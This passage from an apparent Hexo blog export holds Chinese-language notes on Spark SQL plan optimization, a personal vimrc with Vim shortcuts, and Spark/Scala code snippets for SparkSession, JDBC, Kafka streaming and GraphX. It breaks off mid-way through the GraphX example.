<li><code>Execute</code>：执行物理计划</li>
</ul>
<h2 id="Spark-SQL逻辑计划优化"><a href="#Spark-SQL逻辑计划优化" class="headerlink" title="Spark SQL逻辑计划优化"></a>Spark SQL逻辑计划优化</h2><h3 id="orderBy-filter"><a href="#orderBy-filter" class="headerlink" title="orderBy/filter"></a>orderBy/filter</h3><p>读取一张parquet存储的hive表，对某列进行排序<code>orderBy</code>，排序结果根据<code>filter</code>，最终选择一列为想要的DataFrame</p>
<p>将<code>Analyzed Logical Plan</code>原始逻辑的处理流程图和<code>Physical Plan</code>最终的物理计划流程图进行对比：</p>
<p><img src="https://z3.ax1x.com/2021/08/25/hZoCHs.md.png" alt="hZoCHs.md.png"></p>
<p>由此可见在读取parquet阶段就将过滤条件下推到数据源，并且将需要的列也下推到数据源而不是原计划中的select *。</p>
<h3 id="groupBy-count"><a href="#groupBy-count" class="headerlink" title="groupBy/count"></a>groupBy/count</h3><p>另取一个dataframe，对一列做<code>groupBy</code>聚合操作，然后求count</p>
<p><img src="https://z3.ax1x.com/2021/08/25/hZo9Bj.png" alt="hZo9Bj.png"></p>
<p>对一列进行<code>groupBy</code>聚合计数只需要所有数据的一个字段，因此在逻辑计划优化中加入<code>Project映射裁剪</code>，并且在物理计划中再次下推到数据源</p>
<h3 id="Join-filter"><a href="#Join-filter" class="headerlink" title="Join/filter"></a>Join/filter</h3><p>在<code>join</code>操作后面加入<code>filter</code>，创建两个dataframe备用，join后新dataframe使用filter过滤</p>
<p><img src="https://z3.ax1x.com/2021/08/25/hZIzjg.md.png" alt="hZIzjg.md.png"></p>
]]></content>
      <tags>
        <tag>Big Data</tag>
        <tag>Spark</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim_配置</title>
    <url>/2019/12/26/Vim-%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>天然的Vim写起来太硬核了，还是要学一下怎么配置让自己写起来好受一些</p>
<span id="more"></span>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.ruanyifeng.com/blog/2018/09/vimrc.html">http://www.ruanyifeng.com/blog/2018/09/vimrc.html</a></p>
<p><a href="https://opensource.com/article/18/9/vi-editor-productivity-powerhouse">https://opensource.com/article/18/9/vi-editor-productivity-powerhouse</a></p>
<h3 id="vim有用的快捷键"><a href="#vim有用的快捷键" class="headerlink" title="vim有用的快捷键"></a>vim有用的快捷键</h3><table>
<thead>
<tr>
<th align="left">按键</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">u</td>
<td>撤销</td>
</tr>
<tr>
<td align="left">dd</td>
<td>删除一行</td>
</tr>
<tr>
<td align="left">yy</td>
<td>复制当前行</td>
</tr>
<tr>
<td align="left">nyy</td>
<td>复制n行</td>
</tr>
<tr>
<td align="left">p</td>
<td>黏贴</td>
</tr>
<tr>
<td align="left">ggvG</td>
<td>全选</td>
</tr>
</tbody></table>
<h3 id="我的vimrc"><a href="#我的vimrc" class="headerlink" title="我的vimrc"></a>我的vimrc</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; All system-wide defaults are set in $VIMRUNTIME/debian.vim and sourced by</span><br><span class="line">&quot; the call to :runtime you can find below.  If you wish to change any of those</span><br><span class="line">&quot; settings, you should do it in this file (/etc/vim/vimrc), since debian.vim</span><br><span class="line">&quot; will be overwritten everytime an upgrade of the vim packages is performed.</span><br><span class="line">&quot; It is recommended to make changes after sourcing debian.vim since it alters</span><br><span class="line">&quot; the value of the &#x27;compatible&#x27; option.</span><br><span class="line"></span><br><span class="line">&quot; This line should not be removed as it ensures that various options are</span><br><span class="line">&quot; properly set to work with the Vim-related packages available in Debian.</span><br><span class="line">runtime! debian.vim</span><br><span class="line"></span><br><span class="line">&quot; Uncomment the next line to make Vim more Vi-compatible</span><br><span class="line">&quot; NOTE: debian.vim sets &#x27;nocompatible&#x27;.  Setting &#x27;compatible&#x27; changes numerous</span><br><span class="line">&quot; options, so any other options should be set AFTER setting &#x27;compatible&#x27;.</span><br><span class="line">&quot;set compatible</span><br><span class="line"></span><br><span class="line">&quot; Vim5 and later versions support syntax highlighting. Uncommenting the next</span><br><span class="line">&quot; line enables syntax highlighting by default.</span><br><span class="line">if has(&quot;syntax&quot;)</span><br><span class="line">  syntax on</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">&quot; If using a dark background within the editing area and syntax highlighting</span><br><span class="line">&quot; turn on this option as well</span><br><span class="line">&quot;set background=dark</span><br><span class="line"></span><br><span class="line">&quot; Uncomment the following to have Vim jump to the last position when</span><br><span class="line">&quot; reopening a file</span><br><span class="line">&quot;if has(&quot;autocmd&quot;)</span><br><span class="line">&quot;  au BufReadPost * if line(&quot;&#x27;\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;&#x27;\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g&#x27;\&quot;&quot; | endif</span><br><span class="line">&quot;endif</span><br><span class="line"></span><br><span class="line">&quot; Uncomment the following to have Vim load indentation rules and plugins</span><br><span class="line">&quot; according to the detected filetype.</span><br><span class="line">&quot;if has(&quot;autocmd&quot;)</span><br><span class="line">&quot;  filetype plugin indent on</span><br><span class="line">&quot;endif</span><br><span class="line"></span><br><span class="line">&quot; The following are commented out as they cause vim to behave a lot</span><br><span class="line">&quot; differently from regular Vi. They are highly recommended though.</span><br><span class="line">set showcmd		&quot; Show (partial) command in status line.</span><br><span class="line">set showmatch		&quot; Show matching brackets.</span><br><span class="line">&quot;set ignorecase		&quot; Do case insensitive matching</span><br><span class="line">&quot;set smartcase		&quot; Do smart case matching</span><br><span class="line">&quot;set incsearch		&quot; Incremental search</span><br><span class="line">&quot;set autowrite		&quot; Automatically save before commands like :next and :make</span><br><span class="line">&quot;set hidden		&quot; Hide buffers when they are abandoned</span><br><span class="line">set mouse=a		&quot; Enable mouse usage (all modes)</span><br><span class="line">filetype indent on</span><br><span class="line">set encoding=utf-8</span><br><span class="line">set t_Co=256</span><br><span class="line">set nocompatible</span><br><span class="line"></span><br><span class="line">set autoindent</span><br><span class="line">set tabstop=4</span><br><span class="line">set expandtab</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line"></span><br><span class="line">set number</span><br><span class="line">set relativenumber</span><br><span class="line">set cursorline</span><br><span class="line">set textwidth=80</span><br><span class="line">set wrap</span><br><span class="line">set linebreak</span><br><span class="line">set wrapmargin=2</span><br><span class="line">set scrolloff=5</span><br><span class="line">set laststatus=2</span><br><span class="line">set ruler</span><br><span class="line"></span><br><span class="line">set showmatch</span><br><span class="line">set hlsearch</span><br><span class="line">set incsearch</span><br><span class="line">set ignorecase</span><br><span class="line">set smartcase</span><br><span class="line"></span><br><span class="line">&quot;set nobackup</span><br><span class="line">&quot;set noswapfile</span><br><span class="line">set undofile</span><br><span class="line">&quot;set backupdir=~/.vim/.backup//  </span><br><span class="line">&quot;set directory=~/.vim/.swp//</span><br><span class="line">set undodir=~/.vim/.undo//</span><br><span class="line">set visualbell</span><br><span class="line">set history=1000</span><br><span class="line">set wildmenu</span><br><span class="line">set wildmode=longest:list,full</span><br><span class="line"></span><br><span class="line">inoremap &#x27; &#x27;&#x27;&lt;ESC&gt;i</span><br><span class="line">inoremap &quot; &quot;&quot;&lt;ESC&gt;i</span><br><span class="line">inoremap ( ()&lt;ESC&gt;i</span><br><span class="line">inoremap [ []&lt;ESC&gt;i</span><br><span class="line">inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class="line"></span><br><span class="line">&quot; Source a global configuration file if available</span><br><span class="line">if filereadable(&quot;/etc/vim/vimrc.local&quot;)</span><br><span class="line">  source /etc/vim/vimrc.local</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>

<p>开头的一些下下来就有的，稍做对比就可以发现，如果觉得哪一行set不清楚，可以去上文的链接中找到</p>
<h3 id="换皮肤"><a href="#换皮肤" class="headerlink" title="换皮肤"></a>换皮肤</h3><p>给vim换个皮肤也是不错的选择</p>
<p><a href="https://opensource.com/article/19/12/colors-themes-vim?utm_campaign=intrel">https://opensource.com/article/19/12/colors-themes-vim?utm_campaign=intrel</a></p>
<p>我自己比较喜欢desert，就直接在vimrc后面加上了 colorscheme desert就完成了</p>
]]></content>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Spark/Scala note</title>
    <url>/2021/07/03/Spark%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%AE%B5/</url>
    <content><![CDATA[<p>Spark 常用代码段和Scala的一些笔记</p>
<span id="more"></span>

<h1 id="Spark-常用代码段"><a href="#Spark-常用代码段" class="headerlink" title="Spark 常用代码段"></a>Spark 常用代码段</h1><h2 id="创建SparkContext"><a href="#创建SparkContext" class="headerlink" title="创建SparkContext"></a>创建SparkContext</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="keyword">this</span>.getClass.getCanonicalName.init).setMaster(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">sc.setLogLevel(<span class="string">&quot;WARN&quot;</span>)</span><br><span class="line"></span><br><span class="line">sc.stop()</span><br></pre></td></tr></table></figure>

<h2 id="创建SparkSession"><a href="#创建SparkSession" class="headerlink" title="创建SparkSession"></a>创建SparkSession</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> spark = <span class="type">SparkSession</span></span><br><span class="line">.builder()</span><br><span class="line">.appName(<span class="string">&quot;Demo1&quot;</span>)</span><br><span class="line">.master(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">.enableHiveSupport()</span><br><span class="line"><span class="comment">// Spark使用与Hive相同的约定写parquet数据</span></span><br><span class="line">.config(<span class="string">&quot;spark.sql.parquet.writeLegacyFormat&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">.getOrCreate()</span><br><span class="line"><span class="keyword">val</span> sc = spark.sparkContext</span><br><span class="line">sc.setLogLevel(<span class="string">&quot;warn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// For implicit conversions like converting RDDs to DataFrames </span></span><br><span class="line"><span class="keyword">import</span> spark.implicits._</span><br><span class="line"></span><br><span class="line">spark.close()</span><br></pre></td></tr></table></figure>

<h2 id="SparkSession从csv读取"><a href="#SparkSession从csv读取" class="headerlink" title="SparkSession从csv读取"></a>SparkSession从csv读取</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> df: <span class="type">DataFrame</span> = spark.read</span><br><span class="line">.option(<span class="string">&quot;header&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;inferschema&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">.csv(<span class="string">&quot;data/emp.dat&quot;</span>)</span><br><span class="line"></span><br><span class="line">df.printSchema()</span><br><span class="line">df.show()</span><br></pre></td></tr></table></figure>

<h2 id="SparkSession执行sql样例"><a href="#SparkSession执行sql样例" class="headerlink" title="SparkSession执行sql样例"></a>SparkSession执行sql样例</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 准备数据</span></span><br><span class="line"><span class="keyword">val</span> arr = <span class="type">Array</span>(<span class="string">&quot;1 1,2,3&quot;</span>, <span class="string">&quot;2 2,3&quot;</span>, <span class="string">&quot;3 1,2&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> rdd: <span class="type">RDD</span>[<span class="type">Info</span>] = spark.sparkContext.makeRDD(arr)</span><br><span class="line">.map &#123; line =&gt;</span><br><span class="line">  <span class="keyword">val</span> fields: <span class="type">Array</span>[<span class="type">String</span>] = line.split(<span class="string">&quot;\\s+&quot;</span>)</span><br><span class="line">  <span class="type">Info</span>(fields(<span class="number">0</span>), fields(<span class="number">1</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">val</span> ds: <span class="type">Dataset</span>[<span class="type">Info</span>] = spark.createDataset(rdd)</span><br><span class="line">ds.createOrReplaceTempView(<span class="string">&quot;t1&quot;</span>)</span><br><span class="line">ds.show</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用SQL处理 - HQL</span></span><br><span class="line">spark.sql(</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        |select id, tag</span></span><br><span class="line"><span class="string">        |  from t1</span></span><br><span class="line"><span class="string">        |       lateral view explode(split(tags, &quot;,&quot;)) t2 as tag</span></span><br><span class="line"><span class="string">        |&quot;&quot;&quot;</span>.stripMargin</span><br><span class="line">).show</span><br><span class="line"></span><br><span class="line"><span class="comment">// SparkSQL</span></span><br><span class="line">spark.sql(</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        |select id, explode(split(tags, &quot;,&quot;)) tag</span></span><br><span class="line"><span class="string">        |  from t1</span></span><br><span class="line"><span class="string">        |&quot;&quot;&quot;</span>.stripMargin</span><br><span class="line">).show</span><br></pre></td></tr></table></figure>

<h2 id="SparkSession写入csv"><a href="#SparkSession写入csv" class="headerlink" title="SparkSession写入csv"></a>SparkSession写入csv</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">spark.sql(<span class="string">&quot;select * from people&quot;</span>) </span><br><span class="line">.write .format(<span class="string">&quot;csv&quot;</span>) </span><br><span class="line">.mode(<span class="string">&quot;overwrite&quot;</span>) </span><br><span class="line">.save(<span class="string">&quot;data/csv&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="SparkSession连接jdbc"><a href="#SparkSession连接jdbc" class="headerlink" title="SparkSession连接jdbc"></a>SparkSession连接jdbc</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// jdbc</span></span><br><span class="line"><span class="keyword">val</span> jdbcDF: <span class="type">DataFrame</span> = spark.read</span><br><span class="line">.format(<span class="string">&quot;jdbc&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;jdbc:mysql://linux123:3306/ebiz?useSSL=false&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;hive&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;12345678&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;driver&quot;</span>, <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;dbtable&quot;</span>, <span class="string">&quot;lagou_product_info&quot;</span>)</span><br><span class="line">.load()</span><br><span class="line">jdbcDF.show()</span><br><span class="line"></span><br><span class="line">jdbcDF.write</span><br><span class="line">.format(<span class="string">&quot;jdbc&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;jdbc:mysql://linux123:3306/ebiz?useSSL=false&amp;characterEncoding=utf8&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;hive&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;12345678&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;driver&quot;</span>, <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>)</span><br><span class="line">.option(<span class="string">&quot;dbtable&quot;</span>, <span class="string">&quot;lagou_product_info_back&quot;</span>)</span><br><span class="line">.mode(<span class="type">SaveMode</span>.<span class="type">Append</span>)</span><br><span class="line">.save()</span><br></pre></td></tr></table></figure>

<h2 id="创建StreamingContext"><a href="#创建StreamingContext" class="headerlink" title="创建StreamingContext"></a>创建StreamingContext</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="type">Logger</span>.getLogger(<span class="string">&quot;org&quot;</span>).setLevel(<span class="type">Level</span>.<span class="type">ERROR</span>)</span><br><span class="line"><span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>()</span><br><span class="line">.setAppName(<span class="keyword">this</span>.getClass.getCanonicalName)</span><br><span class="line">.setMaster(<span class="string">&quot;local[2]&quot;</span>)</span><br><span class="line"><span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(conf, <span class="type">Seconds</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建DStream</span></span><br><span class="line"><span class="keyword">val</span> lines: <span class="type">DStream</span>[<span class="type">String</span>] = ssc.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DStream转换</span></span><br><span class="line"><span class="keyword">val</span> words: <span class="type">DStream</span>[<span class="type">String</span>] = lines.flatMap(_.split(<span class="string">&quot;\\s+&quot;</span>))</span><br><span class="line"><span class="keyword">val</span> result: <span class="type">DStream</span>[(<span class="type">String</span>, <span class="type">Int</span>)] = words.map((_, <span class="number">1</span>)).reduceByKey(_ + _)</span><br><span class="line"></span><br><span class="line"><span class="comment">// DStream输出</span></span><br><span class="line">result.print(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动作业</span></span><br><span class="line">ssc.start()</span><br><span class="line">ssc.awaitTermination()</span><br></pre></td></tr></table></figure>

<h2 id="StreamingContext整合Kafka"><a href="#StreamingContext整合Kafka" class="headerlink" title="StreamingContext整合Kafka"></a>StreamingContext整合Kafka</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">KafkaDStream1</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line"><span class="comment">//    Logger.getLogger(&quot;org&quot;).setLevel(Level.ERROR)</span></span><br><span class="line">    <span class="keyword">val</span> conf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="string">&quot;FileDStream&quot;</span>).setMaster(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> ssc = <span class="keyword">new</span> <span class="type">StreamingContext</span>(conf, <span class="type">Seconds</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义kafka相关参数</span></span><br><span class="line">    <span class="keyword">val</span> groupId: <span class="type">String</span> = <span class="string">&quot;mygroup01&quot;</span></span><br><span class="line">    <span class="keyword">val</span> topics: <span class="type">Array</span>[<span class="type">String</span>] = <span class="type">Array</span>(<span class="string">&quot;lg_bus_info2&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> kafkaParams: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>] = getKafkaConsumerParameters(groupId)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建DStream</span></span><br><span class="line">    <span class="keyword">val</span> dstream: <span class="type">InputDStream</span>[<span class="type">ConsumerRecord</span>[<span class="type">String</span>, <span class="type">String</span>]] = <span class="type">KafkaUtils</span>.createDirectStream(</span><br><span class="line">      ssc,</span><br><span class="line">      <span class="type">LocationStrategies</span>.<span class="type">PreferConsistent</span>,</span><br><span class="line">      <span class="type">ConsumerStrategies</span>.<span class="type">Subscribe</span>[<span class="type">String</span>, <span class="type">String</span>](topics, kafkaParams)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// DStream转换&amp;输出</span></span><br><span class="line">    dstream.foreachRDD&#123; (rdd, time) =&gt;</span><br><span class="line">      println(<span class="string">s&quot;*********** rdd.count = <span class="subst">$&#123;rdd.count()&#125;</span>; time = <span class="subst">$time</span> *************&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动作业</span></span><br><span class="line">    ssc.start()</span><br><span class="line">    ssc.awaitTermination()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">getKafkaConsumerParameters</span></span>(groupid: <span class="type">String</span>): <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>] = &#123;</span><br><span class="line">    <span class="type">Map</span>[<span class="type">String</span>, <span class="type">Object</span>](</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">BOOTSTRAP_SERVERS_CONFIG</span> -&gt; <span class="string">&quot;hadoop3:9092,hadoop4:9092&quot;</span>,</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">KEY_DESERIALIZER_CLASS_CONFIG</span> -&gt; classOf[<span class="type">StringDeserializer</span>],</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">VALUE_DESERIALIZER_CLASS_CONFIG</span> -&gt; classOf[<span class="type">StringDeserializer</span>],</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">GROUP_ID_CONFIG</span> -&gt; groupid,</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">ENABLE_AUTO_COMMIT_CONFIG</span> -&gt; (<span class="literal">false</span>: java.lang.<span class="type">Boolean</span>),</span><br><span class="line">      <span class="type">ConsumerConfig</span>.<span class="type">AUTO_OFFSET_RESET_CONFIG</span> -&gt; <span class="string">&quot;earliest&quot;</span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Spark-GraphX基本操作"><a href="#Spark-GraphX基本操作" class="headerlink" title="Spark GraphX基本操作"></a>Spark GraphX基本操作</h2><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">GraphXExample1</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="keyword">this</span>.getClass.getCanonicalName)</span><br><span class="line">      .setMaster(<span class="string">&quot;local[*]&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">    sc.setLogLevel(<span class="string">&quot;warn&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义顶点</span></span><br><span class="line">    <span class="keyword">val</span> vertexArray: <span class="type">Array</span>[(<span class="type">VertexId</span>, (<span class="type">String</span>, <span class="type">Int</span>))] = <span class="type">Array</span>(</span><br><span class="line">      (<span class="number">1</span>L, (<span class="string">&quot;Alice&quot;</span>, <span class="number">28</span>)),</span><br><span class="line">      (<span class="number">2</span>L, (<span class="string">&quot;Bob&quot;</span>, <span class="number">27</span>)),</span><br><span class="line">      (<span class="number">3</span>L, (<span class="string">&quot;Charlie&quot;</span>, <span class="number">65</span>)),</span><br><span class="line">      (<span class="number">4</span>L, (<span class="string">&quot;David&quot;</span>, <span class="number">42</span>)),</span><br><span class="line">      (<span class="number">5</span>L, (<span class="string">&quot;Ed&quot;</span>, <span class="number">55</span>)),</span><br><span class="line">      (<span class="number">6</span>L, (<span class="string">&quot;Fran&quot;</span>, <span class="number">50</span>))</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">val</span> vertexRDD: <span class="type">RDD</span>[(<span class="type">VertexId</span>, (<span class="type">String</span>, <span class="type">Int</span>))] = sc.makeRDD(vertexArray)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义边</span></span><br><span class="line">    <span class="keyword">val</span> edgeArray: <span class="type">Array</span>[<span class="type">Edge</span>[<span class="type">Int</span>]] = <span class="type">Array</span>(</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">2</span>L, <span class="number">1</span>L, <span class="number">7</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">2</span>L, <span class="number">4</span>L, <span class="number">2</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">3</span>L, <span class="number">2</span>L, <span class="number">4</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">3</span>L, <span class="number">6</span>L, <span class="number">6</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">4</span>L, <span class="number">1</span>L, <span class="number">1</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">5</span>L, <span class="number">2</span>L, <span class="number">2</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">5</span>L, <span class="number">3</span>L, <span class="number">8</span>),</span><br><span class="line">      <span class="type">Edge</span>(<span class="number">5</span>L, <span class="number">6</span>L, <span class="number">3</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">val</span> edgeRDD: <span class="type">RDD</span>[<span class="type">Edge</span>[<span class="type">Int</span>]] = sc.makeRDD(edgeArray)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 图的定义</span></span><br><span class="line">    <span class="keyword">val</span> graph: <span class="type">Graph</span>[(<span class="type">String</span>, <span class="type">Int</span>), <span class="type">Int</span>] = <span class="type">Graph</span>(vertexRDD, edgeRDD)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 属性操作(找出图中年龄 &gt; 30 的顶点；属性 &gt; 5 的边； 属性 &gt; 5 的 triplets)</span></span><br><span class="line"><span class="comment">//    graph.vertices</span></span><br><span class="line"><span class="comment">//        .filter&#123;case (_, (_, age)) =&gt; age &gt; 30&#125;</span></span><br><span class="line"><span class="comment">//        .foreach(println)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    graph.edges</span></span><br><span class="line"><span class="comment">//        .filter(edge =&gt; edge.attr &gt; 5)</span></span><br><span class="line"><span class="comment">//      .foreach(println)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    graph.triplets</span></span><br><span class="line"><span class="comment">//      .filter &#123; t =&gt; t.attr &gt; 5 &#125;</span></span><br><span class="line"><span class="comment">//      .foreach(println)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 属性操作。degress操作，找出图中最大的出度、入度、度数</span></span><br><span class="line"><span class="comment">//    val inDegress: (VertexId, Int) = graph.inDegrees</span></span><br><span class="line"><span class="comment">//      .reduce((x, y) =&gt; if (x._2 &gt; y._2) x else y)</span></span><br><span class="line"><span class="comment">//    println(s&quot;inDegress = $inDegress&quot;)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    val outDegress: (VertexId, Int) = graph.outDegrees</span></span><br><span class="line"><span class="comment">//      .reduce((x, y) =&gt; if (x._2 &gt; y._2) x else y)</span></span><br><span class="line"><span class="comment">//    println(s&quot;outDegress = $outDegress&quot;)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    val degress: (VertexId, Int) = graph.degrees</span></span><br><span class="line"><span class="comment">//      .reduce((x, y) =&gt; if (x._2 &gt; y._2) x else y)</span></span><br><span class="line"><span class="comment">//    println(s&quot;degress = $degress&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换操作。顶点转换，所有人年龄加 100</span></span><br><span class="line"><span class="comment">//    graph.mapVertices&#123;case (id, (name, age)) =&gt; (id, (name, age+100))&#125;</span></span><br><span class="line"><span class="comment">//        .vertices</span></span><br><span class="line"><span class="comment">//        .foreach(println)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 边的转换，边的属性*2</span></span><br><span class="line"><span class="comment">//    graph.mapEdges(e =&gt; e.attr * 2)</span></span><br><span class="line"><span class="comment">//        .edges</span></span><br><span class="line"><span class="comment">//        .foreach(println)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 结构操作。顶点年龄 &gt; 30 的子图</span></span><br><span class="line"><span class="comment">//    val subGraph: Graph[(String, Int), Int] = graph.subgraph(vpred = (id, vd) =&gt; vd._2 &gt; 30)</span></span><br><span class="line"><span class="comment">//    subGraph.edges.foreach(println)</span></span><br><span class="line"><span class="comment">//    subGraph.vertices.foreach(println)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找出出度=入度的人员。连接操作</span></span><br><span class="line">    <span class="comment">// 思路：图 + 顶点的出度 + 顶点的入度 =&gt; 连接操作</span></span><br><span class="line"><span class="comment">//    val initailUserGraph: Graph[User, Int] = graph.mapVertices &#123; case (id, (name, age)) =&gt; User(name, age, 0, 0) &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    val userGraph: Graph[User, Int] = initailUserGraph.outerJoinVertices(initailUserGraph.inDegrees) &#123;</span></span><br><span class="line"><span class="comment">//      case (id, u, inDeg) =&gt; User(u.name, u.age, inDeg.getOrElse(0), u.outDegress)</span></span><br><span class="line"><span class="comment">//    &#125;.outerJoinVertices(initailUserGraph.outDegrees) &#123;</span></span><br><span class="line"><span class="comment">//      case (id, u, outDeg) =&gt; User(u.name, u.age, u.inDegress, outDeg.getOrElse(0))</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    userGraph.vertices.filter&#123;case (_, user) =&gt; user.inDegress==user.outDegress&#125;</span></span><br><span class="line"><span class="comment">//        .foreach(println)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 顶点5到其他各顶点的最短距离。聚合操作(Pregel API)</span></span><br><span class="line">    <span class="keyword">val</span> sourceId: <span class="type">VertexId</span> = <span class="number">5</span>L</span><br><span class="line">    <span class="keyword">val</span> initailGraph: <span class="type">Graph</span>[<span class="type">Double</span>, <span class="type">Int</span>] = graph.mapVertices((id, 